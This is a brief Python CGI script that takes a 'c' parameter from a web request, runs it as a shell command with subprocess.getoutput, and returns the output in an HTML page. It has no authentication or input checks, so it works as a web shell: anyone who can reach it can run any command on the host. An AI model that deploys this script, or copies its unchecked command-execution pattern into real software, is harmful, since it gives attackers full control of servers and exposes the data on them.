#!/usr/bin/python36

import cgi
import subprocess

print("content-type: text/html")
print("")

a=cgi.FieldStorage()
b=a.getvalue('c')

ch=subprocess.getoutput(b)
	
print("<pre>")
print(ch)
print("</pre>")
